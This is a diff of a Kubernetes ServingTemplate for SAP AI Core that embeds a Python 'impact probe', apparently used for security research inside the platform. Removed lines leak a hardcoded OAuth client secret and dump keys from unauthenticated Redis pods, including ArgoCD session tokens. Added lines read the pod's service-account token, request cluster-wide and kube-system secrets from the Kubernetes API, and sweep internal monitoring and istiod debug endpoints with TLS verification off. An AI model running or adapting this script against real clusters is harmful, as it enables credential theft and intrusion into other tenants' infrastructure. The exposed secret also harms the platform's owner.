@@ -1,14 +1,14 @@
 apiVersion: ai.sap.com/v1alpha1
 kind: ServingTemplate
 metadata:
-  name: impact-probe-v4
+  name: impact-probe-v5
   labels:
-    scenarios.ai.sap.com/id: "impact-probe-v4"
+    scenarios.ai.sap.com/id: "impact-probe-v5"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "impact-probe-v4"
-    executables.ai.sap.com/name: "impact-probe-v4"
-    executables.ai.sap.com/description: "impact verification probe v4"
+    scenarios.ai.sap.com/name: "impact-probe-v5"
+    executables.ai.sap.com/name: "impact-probe-v5"
+    executables.ai.sap.com/description: "impact verification probe v5"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -30,12 +30,8 @@ spec:
             cat > /tmp/probe.py << 'PYEOF'
             import os, ssl, socket, json, re, base64, time, urllib.request, urllib.error
 
-            CLIENT_ID     = "sb-aicore-bb-12!b627551|aicore-xsuaa-std!b563784"
-            CLIENT_SECRET = "aicore-bb-12-key$gbdxl0aC0lXqLFQwlGFyB2cqAAHsAen7wWYqOl89fbw="
-            TOKEN_URL     = "https://cf-aicore-security-bb-12.authentication.eu10.hana.ondemand.com/oauth/token"
-
             def report(k, v):
-                print(f"[P4] {k}: {str(v)[:6000]}", flush=True)
+                print(f"[P5] {k}: {str(v)[:6000]}", flush=True)
 
             def http_get(url, headers=None, timeout=10):
                 try:
@@ -53,220 +49,233 @@ spec:
                 except Exception as e:
                     return f"ERR:{e}", 0, {}
 
-            def http_post_form(url, fields, headers=None, timeout=10):
+            def https_get_with_token(url, token, cafile=None, timeout=10):
                 try:
-                    data = "&".join(f"{k}={v}" for k, v in fields.items()).encode()
-                    h = {"Content-Type": "application/x-www-form-urlencoded"}
-                    if headers: h.update(headers)
-                    req = urllib.request.Request(url, data=data, headers=h, method="POST")
-                    ctx = ssl.create_default_context()
+                    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
+                    ctx = ssl.create_default_context(cafile=cafile)
                     ctx.check_hostname = False
                     ctx.verify_mode = ssl.CERT_NONE
                     with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                         return r.read().decode("utf-8", errors="replace"), r.status
                 except urllib.error.HTTPError as e:
                     body = ""
-                    try: body = e.read().decode("utf-8", errors="replace")[:500]
+                    try: body = e.read().decode("utf-8", errors="replace")[:800]
                     except: pass
                     return f"HTTP_{e.code}:{body}", e.code
                 except Exception as e:
                     return f"ERR:{e}", 0
 
-            def redis_probe(host, port, label, timeout=8):
-                """Send multiple Redis commands over one connection and read all responses."""
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(timeout)
-                    s.connect((host, port))
-                    # send several commands in a pipeline
-                    cmds = b"PING\r\nINFO server\r\nDBSIZE\r\nCONFIG GET maxmemory\r\n"
-                    s.sendall(cmds)
-                    time.sleep(2)
-                    resp = b""
-                    s.settimeout(5)
-                    try:
-                        while True:
-                            chunk = s.recv(16384)
-                            if not chunk: break
-                            resp += chunk
-                    except socket.timeout:
-                        pass
-                    s.close()
-                    decoded = resp.decode("utf-8", errors="replace")
-                    report(f"REDIS_{label}_raw", repr(decoded[:800]))
-                    if "+PONG" in decoded or "$" in decoded or "-" in decoded:
-                        report(f"REDIS_{label}_LIVE", "YES - got Redis protocol response")
-                        if "-NOAUTH" in decoded:
-                            report(f"REDIS_{label}_AUTH", "requires password")
-                        elif "+PONG" in decoded:
-                            report(f"REDIS_{label}_NOAUTH", "NO PASSWORD REQUIRED")
-                            # Try to dump keys
-                            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            s2.settimeout(timeout)
-                            s2.connect((host, port))
-                            s2.sendall(b"SCAN 0 COUNT 100\r\nKEYS *\r\n")
-                            time.sleep(2)
-                            resp2 = b""
-                            s2.settimeout(5)
-                            try:
-                                while True:
-                                    c = s2.recv(16384)
-                                    if not c: break
-                                    resp2 += c
-                            except socket.timeout:
-                                pass
-                            s2.close()
-                            report(f"REDIS_{label}_KEYS", repr(resp2.decode("utf-8", errors="replace")[:2000]))
-                except Exception as e:
-                    report(f"REDIS_{label}_ERR", str(e))
-
-            # ── fetch JWT ─────────────────────────────────────────────────────────
-            cred_b64 = base64.b64encode(f"{CLIENT_ID}:{CLIENT_SECRET}".encode()).decode()
-            token_body, token_code = http_post_form(
-                TOKEN_URL, {"grant_type": "client_credentials"},
-                headers={"Authorization": f"Basic {cred_b64}"}, timeout=15)
-            JWT = json.loads(token_body)["access_token"] if token_code == 200 else None
-            report("JWT", f"obtained={JWT is not None}")
-            AUTH = {"Authorization": f"Bearer {JWT}"} if JWT else {}
-
-            # ── 1. REDIS pod IPs directly ─────────────────────────────────────────
-            report("---", "=== REDIS direct pod IPs ===")
-            redis_targets = [
-                ("100.64.0.67",   6379, "serving"),
-                ("100.64.0.42",   6379, "rage-proxy-inference"),
-                ("100.64.88.24",  6379, "not-diamond"),
-                ("100.64.0.76",   6379, "argocd-server-0"),
-                ("100.64.80.87",  6379, "argocd-haproxy"),
-                # user-management redis pod IP (not known yet, try service)
-                ("redis.user-management.svc.cluster.local", 6379, "user-mgmt-svc"),
-            ]
-            for host, port, label in redis_targets:
-                redis_probe(host, port, label)
-
-            # ── 2. NOT-DIAMOND server pod IPs ─────────────────────────────────────
-            report("---", "=== NOT-DIAMOND direct pod IPs ===")
-            nd_ips = ["100.64.85.27", "100.64.84.26"]
-            for ip in nd_ips:
-                for port in [80, 8080, 5000, 8000, 3000, 443]:
-                    body, code, hdrs = http_get(f"http://{ip}:{port}/", timeout=5)
-                    report(f"ND_{ip}:{port}_root", f"[{code}] hdrs={list(hdrs.keys())[:4]} {body[:300]}")
-                    if code not in (0,) and "ERR" not in body[:4] and code not in (502, 503):
-                        for path in ["/health", "/v1/models", "/api", "/metrics",
-                                     "/v1/chat/completions", "/v1/embeddings"]:
-                            b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=5)
-                            report(f"ND_{ip}:{port}{path}", f"[{c2}] {b2[:400]}")
-
-            # ── 3. ML-TRACKING pod IP directly ────────────────────────────────────
-            report("---", "=== ML-TRACKING pod IP ===")
-            ml_ip = "100.64.98.13"
-            for port in [80, 5000, 8080]:
-                body, code, hdrs = http_get(f"http://{ml_ip}:{port}/", headers=AUTH, timeout=8)
-                report(f"MLFLOW_PODIP_{port}", f"[{code}] {body[:400]}")
-                if code not in (0,):
-                    for path in ["/health", "/api/2.0/mlflow/experiments/list",
-                                  "/api/2.0/mlflow/runs/search"]:
-                        b2, c2, _ = http_get(f"http://{ml_ip}:{port}{path}", headers=AUTH, timeout=8)
-                        report(f"MLFLOW_PODIP_{port}{path.replace('/','_')}", f"[{c2}] {b2[:600]}")
-
-            # ── 4. USER-MANAGEMENT pod IPs ────────────────────────────────────────
-            report("---", "=== USER-MANAGEMENT pod IPs ===")
-            um_ips = ["100.64.91.17", "100.64.89.17"]   # user-management-api pods
-            for ip in um_ips:
-                for port in [5000, 8080, 80]:
-                    body, code, hdrs = http_get(f"http://{ip}:{port}/", headers=AUTH, timeout=8)
-                    report(f"UM_PODIP_{ip}:{port}", f"[{code}] {body[:400]}")
-                    if code not in (0,) and "ERR:timed" not in body:
-                        for path in ["/health", "/api/v1/tenants", "/api/v1/users",
-                                     "/api/v1/subaccounts"]:
-                            b2, c2, _ = http_get(f"http://{ip}:{port}{path}", headers=AUTH, timeout=8)
-                            report(f"UM_PODIP_{port}{path.replace('/','_')}", f"[{c2}] {b2[:500]}")
-
-            # ── 5. ARGOCD Redis HA — read session/app data ────────────────────────
-            report("---", "=== ARGOCD Redis HA ===")
-            # ArgoCD stores session tokens in Redis - try to read them
-            argocd_redis_ip = "100.64.0.76"
+            # ── 1. POD IDENTITY / FILESYSTEM ────────────────────────────────────────
+            report("---", "=== POD IDENTITY ===")
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(10)
-                s.connect((argocd_redis_ip, 6379))
-                cmds = b"PING\r\nINFO server\r\nDBSIZE\r\nSCAN 0 COUNT 50\r\nKEYS *session*\r\nKEYS *token*\r\nKEYS *app*\r\n"
-                s.sendall(cmds)
-                time.sleep(3)
-                resp = b""
-                s.settimeout(6)
-                try:
-                    while True:
-                        chunk = s.recv(16384)
-                        if not chunk: break
-                        resp += chunk
-                except socket.timeout:
-                    pass
-                s.close()
-                decoded = resp.decode("utf-8", errors="replace")
-                report("ARGOCD_REDIS_raw", repr(decoded[:3000]))
+                sa_token = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
+                namespace = open("/var/run/secrets/kubernetes.io/serviceaccount/namespace").read().strip()
+                report("SA_NAMESPACE", namespace)
+                report("SA_TOKEN_PREFIX", sa_token[:80])
+                # Decode JWT payload (middle part) to see SA name/claims
+                parts = sa_token.split(".")
+                if len(parts) == 3:
+                    pad = len(parts[1]) % 4
+                    payload = base64.b64decode(parts[1] + "=" * (4 - pad) if pad else parts[1]).decode("utf-8", errors="replace")
+                    report("SA_TOKEN_PAYLOAD", payload[:800])
             except Exception as e:
-                report("ARGOCD_REDIS_ERR", str(e))
+                report("SA_TOKEN_ERR", str(e))
+                sa_token = None
+                namespace = "unknown"
 
-            # ── 6. GET MAIN CONTAINER IMAGES from OTel TA ────────────────────────
-            report("---", "=== Main container images via OTel TA ===")
+            try:
+                report("ETC_HOSTS", open("/etc/hosts").read())
+            except: pass
+
+            try:
+                # /proc/net/fib_trie gives us routing table with node IP
+                fib = open("/proc/net/fib_trie").read()
+                # Extract all LOCAL entries (those are the real IPs)
+                ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)\n\s+/32 host LOCAL", fib)
+                report("POD_LOCAL_IPS", str(ips))
+            except Exception as e:
+                report("FIB_ERR", str(e))
+
+            try:
+                report("PROC_NET_ROUTE", open("/proc/net/route").read()[:1000])
+            except: pass
+
+            k8s_host = os.environ.get("KUBERNETES_SERVICE_HOST", "")
+            k8s_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
+            report("K8S_API_HOST", f"{k8s_host}:{k8s_port}")
+
+            # ── 2. KUBERNETES API WITH SA TOKEN ────────────────────────────────────
+            report("---", "=== KUBERNETES API (SA TOKEN) ===")
+            if sa_token and k8s_host:
+                base_url = f"https://{k8s_host}:{k8s_port}"
+                ca = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+
+                for path, label in [
+                    ("/api", "API_ROOT"),
+                    ("/api/v1", "API_V1"),
+                    ("/api/v1/namespaces", "ALL_NAMESPACES"),
+                    (f"/api/v1/namespaces/{namespace}", "OWN_NAMESPACE"),
+                    (f"/api/v1/namespaces/{namespace}/pods", "OWN_PODS"),
+                    (f"/api/v1/namespaces/{namespace}/secrets", "OWN_SECRETS"),
+                    (f"/api/v1/namespaces/{namespace}/configmaps", "OWN_CONFIGMAPS"),
+                    (f"/api/v1/namespaces/{namespace}/serviceaccounts", "OWN_SAS"),
+                    ("/api/v1/namespaces/couchdb/pods", "COUCHDB_PODS"),
+                    ("/api/v1/namespaces/grafana/pods", "GRAFANA_PODS"),
+                    ("/api/v1/namespaces/velero/pods", "VELERO_PODS"),
+                    ("/api/v1/namespaces/kube-system/secrets", "KUBE_SYSTEM_SECRETS"),
+                    ("/api/v1/nodes", "ALL_NODES"),
+                    ("/api/v1/secrets", "ALL_SECRETS_CLUSTER"),
+                    ("/apis/ai.sap.com/v1alpha1/servingtemplates", "ALL_SERVINGTEMPLATES"),
+                    ("/apis/ai.sap.com/v1alpha1/resourcegroups", "ALL_RESOURCEGROUPS"),
+                ]:
+                    body, code = https_get_with_token(base_url + path, sa_token, cafile=ca, timeout=10)
+                    report(f"K8S_{label}", f"[{code}] {body[:600]}")
+
+                # TokenReview to see what identity this token has
+                tr_body = json.dumps({"apiVersion":"authentication.k8s.io/v1","kind":"TokenReview","spec":{"token":sa_token}}).encode()
+                try:
+                    req = urllib.request.Request(base_url + "/apis/authentication.k8s.io/v1/tokenreviews",
+                        data=tr_body,
+                        headers={"Authorization": f"Bearer {sa_token}", "Content-Type": "application/json"})
+                    ctx2 = ssl.create_default_context()
+                    ctx2.check_hostname = False
+                    ctx2.verify_mode = ssl.CERT_NONE
+                    with urllib.request.urlopen(req, context=ctx2, timeout=10) as r:
+                        report("K8S_TOKENREVIEW", r.read().decode()[:800])
+                except Exception as e:
+                    report("K8S_TOKENREVIEW_ERR", str(e))
+
+            # ── 3. FULL OTEL TA IMAGE INVENTORY ────────────────────────────────────
+            report("---", "=== FULL CONTAINER IMAGE INVENTORY (OTel TA) ===")
             ta_url = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80/jobs/kubernetes-pods/targets"
             body_ta, code_ta, _ = http_get(ta_url, timeout=20)
             if code_ta == 200:
                 try:
                     data = json.loads(body_ta)
-                    seen = set()
+                    # namespace -> pod -> set of images
+                    pod_images = {}
+                    INTERESTING = ["couchdb", "grafana", "velero", "launchpad", "monitoring",
+                                   "not-diamond", "user-management", "argocd", "redis",
+                                   "serving", "rage-proxy", "ml-tracking", "llm"]
                     for collector_id, cdata in data.items():
                         for tg in cdata.get("targets", []):
                             lbl = tg.get("labels", {})
                             ns  = lbl.get("__meta_kubernetes_namespace", "")
                             pod = lbl.get("__meta_kubernetes_pod_name", "")
-                            # get all annotation keys that mention image
+                            # collect ALL image-related label values
                             for key, val in lbl.items():
-                                if "image" in key.lower() and any(
-                                    s in ns.lower() or s in pod.lower()
-                                    for s in ["grafana", "couchdb", "velero", "redis",
-                                              "argocd", "not-diamond", "user-management"]
-                                ):
-                                    uid = f"{ns}/{pod}/{key}"
-                                    if uid not in seen:
-                                        seen.add(uid)
-                                        report(f"IMG_{ns}_{pod}", f"{key}={val[:200]}")
-                            # also get all container annotations (they include main container images)
-                            istio_status = lbl.get("__meta_kubernetes_pod_annotation_sidecar_istio_io_status", "")
-                            if istio_status and any(
-                                s in ns.lower() or s in pod.lower()
-                                for s in ["grafana", "couchdb", "velero"]
-                            ):
-                                report(f"ISTIO_STATUS_{ns}_{pod}", istio_status[:500])
+                                if "image" in key.lower() and val and "sha256" not in val:
+                                    k = f"{ns}/{pod}"
+                                    if k not in pod_images:
+                                        pod_images[k] = {}
+                                    pod_images[k][key] = val
+                    # print all images for interesting pods
+                    for k, imgs in sorted(pod_images.items()):
+                        ns_part = k.split("/")[0]
+                        if any(s in k.lower() for s in INTERESTING):
+                            for key, val in imgs.items():
+                                report(f"IMG_{k}", f"{key}={val[:200]}")
                 except Exception as e:
                     report("TA_PARSE_ERR", str(e))
+            else:
+                report("TA_ERR", f"[{code_ta}]")
 
-            # ── 7. LLM-ACCESS pod (SAP LLM proxy) ────────────────────────────────
-            report("---", "=== LLM-ACCESS pod IP ===")
-            llm_ip = "100.64.109.21"   # llm-proxy-gsp
-            for port in [80, 8080, 5000, 443]:
-                body, code, hdrs = http_get(f"http://{llm_ip}:{port}/", headers=AUTH, timeout=8)
-                report(f"LLM_PODIP_{port}", f"[{code}] {body[:400]}")
-                if code not in (0,) and "ERR" not in body[:4]:
-                    for path in ["/health", "/v1/models", "/v1/chat/completions"]:
-                        b2, c2, _ = http_get(f"http://{llm_ip}:{port}{path}", headers=AUTH, timeout=8)
-                        report(f"LLM_{port}{path.replace('/','_')}", f"[{c2}] {b2[:600]}")
-
-            # ── 8. FLUENT-BIT pods (log aggregation) ─────────────────────────────
-            report("---", "=== FLUENT-BIT (log exfil check) ===")
-            fb_ips = ["100.64.0.18", "100.64.109.14", "100.64.94.2"]
-            for ip in fb_ips[:2]:
-                for port in [2020, 8080, 9090, 80]:
-                    body, code, _ = http_get(f"http://{ip}:{port}/", timeout=4)
-                    report(f"FLUENTBIT_{ip}:{port}", f"[{code}] {body[:300]}")
+            # ── 4. PROMETHEUS ─────────────────────────────────────────────────────
+            report("---", "=== PROMETHEUS ===")
+            for prom_host in [
+                "prometheus.monitoring.svc.cluster.local",
+                "prometheus-server.monitoring.svc.cluster.local",
+                "prometheus-operated.monitoring.svc.cluster.local",
+                "kube-prometheus-stack-prometheus.monitoring.svc.cluster.local",
+            ]:
+                for port in [9090, 80]:
+                    body, code, _ = http_get(f"http://{prom_host}:{port}/api/v1/targets", timeout=8)
                     if code == 200:
-                        for path in ["/api/v1/health", "/api/v1/metrics",
-                                     "/api/v1/uptime", "/api/v1/plugins"]:
-                            b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=4)
-                            report(f"FLUENTBIT_{port}{path.replace('/','_')}", f"[{c2}] {b2[:400]}")
+                        report(f"PROM_{prom_host}:{port}_targets", body[:3000])
+                        body2, c2, _ = http_get(f"http://{prom_host}:{port}/api/v1/query?query=kube_node_info", timeout=8)
+                        report(f"PROM_NODE_INFO", f"[{c2}] {body2[:2000]}")
+                        body3, c3, _ = http_get(f"http://{prom_host}:{port}/api/v1/label/__name__/values", timeout=8)
+                        report(f"PROM_METRIC_NAMES", f"[{c3}] {body3[:1000]}")
                         break
+                    else:
+                        report(f"PROM_{prom_host}:{port}", f"[{code}] {body[:100]}")
 
-            report("DONE", "probe v4 complete")
+            # ── 5. KUBE-PROXY METRICS (node IP enumeration) ──────────────────────
+            report("---", "=== KUBE-PROXY METRICS ===")
+            body_kp, code_kp, _ = http_get(
+                "http://kube-proxy.kube-system.svc.cluster.local:10249/metrics", timeout=10)
+            if code_kp == 200:
+                # Extract node IPs from iptables rules or network_programming metrics
+                report("KUBE_PROXY_sample", body_kp[:3000])
+                # Look for node annotations / sync rules
+                node_ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)", body_kp)
+                uniq = list(dict.fromkeys(node_ips))
+                report("KUBE_PROXY_IPS_found", str(uniq[:100]))
+            else:
+                report("KUBE_PROXY", f"[{code_kp}] {body_kp[:200]}")
+
+            # ── 6. OTEL COLLECTOR SELF-METRICS + EXTRA ENDPOINTS ─────────────────
+            report("---", "=== OTEL COLLECTOR ENDPOINTS ===")
+            otel_svc = "otel-collector.opentelemetry.svc.cluster.local"
+            for port, path, label in [
+                (8888, "/metrics", "SELF_METRICS"),
+                (8888, "/", "ROOT"),
+                (4318, "/v1/metrics", "OTLP_METRICS"),
+                (13133, "/", "HEALTH"),
+            ]:
+                body, code, _ = http_get(f"http://{otel_svc}:{port}{path}", timeout=6)
+                report(f"OTEL_{label}_{port}", f"[{code}] {body[:400]}")
+
+            # OTel TA additional endpoints
+            ta_svc = "otel-scraper-targetallocator.opentelemetry.svc.cluster.local"
+            for path in ["/jobs", "/scrape_pools", "/", "/metrics", "/collector/{id}/targets"]:
+                body, code, _ = http_get(f"http://{ta_svc}:80{path}", timeout=6)
+                report(f"TA_{path.replace('/','_')}", f"[{code}] {body[:600]}")
+
+            # ── 7. ISTIOD DEBUG PORTS ─────────────────────────────────────────────
+            report("---", "=== ISTIOD DEBUG ===")
+            istiod = "istiod.istio-system.svc.cluster.local"
+            for port, path in [
+                (15014, "/debug/configz"),
+                (15014, "/debug/syncz"),
+                (15014, "/debug/endpointz"),
+                (15014, "/debug/adsz"),
+                (8080,  "/debug/configz"),
+                (8080,  "/ready"),
+            ]:
+                body, code, _ = http_get(f"http://{istiod}:{port}{path}", timeout=6)
+                report(f"ISTIOD_{port}{path.replace('/','_')}", f"[{code}] {body[:400]}")
+
+            # ── 8. NODE EXPORTER / CADVISOR ──────────────────────────────────────
+            report("---", "=== NODE EXPORTER / CADVISOR ===")
+            for svc in [
+                "node-exporter.monitoring.svc.cluster.local",
+                "prometheus-node-exporter.monitoring.svc.cluster.local",
+                "kube-prometheus-stack-prometheus-node-exporter.monitoring.svc.cluster.local",
+            ]:
+                body, code, _ = http_get(f"http://{svc}:9100/metrics", timeout=6)
+                if code == 200:
+                    report(f"NODE_EXPORTER_{svc}", body[:2000])
+                    break
+                else:
+                    report(f"NODE_EXPORTER_{svc}", f"[{code}] {body[:80]}")
+
+            # ── 9. KSM FRESH PULL (node info) ────────────────────────────────────
+            report("---", "=== KSM NODE INFO ===")
+            ksm_url = "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
+            body_ksm, code_ksm, _ = http_get(ksm_url, timeout=15)
+            if code_ksm == 200:
+                lines = body_ksm.split("\n")
+                node_lines = [l for l in lines if "kube_node" in l and not l.startswith("#")]
+                report("KSM_NODE_LINES", "\n".join(node_lines[:100]))
+                # Also pull couchdb/grafana pod info for image versions
+                pod_lines = [l for l in lines if
+                             ("couchdb" in l or "grafana" in l or "velero" in l) and not l.startswith("#")]
+                report("KSM_INTERESTING_PODS", "\n".join(pod_lines[:100]))
+            else:
+                report("KSM_ERR", f"[{code_ksm}] {body_ksm[:200]}")
+
+            report("DONE", "probe v5 complete")
             PYEOF
             python3 /tmp/probe.py 2>&1
             python3 -c "
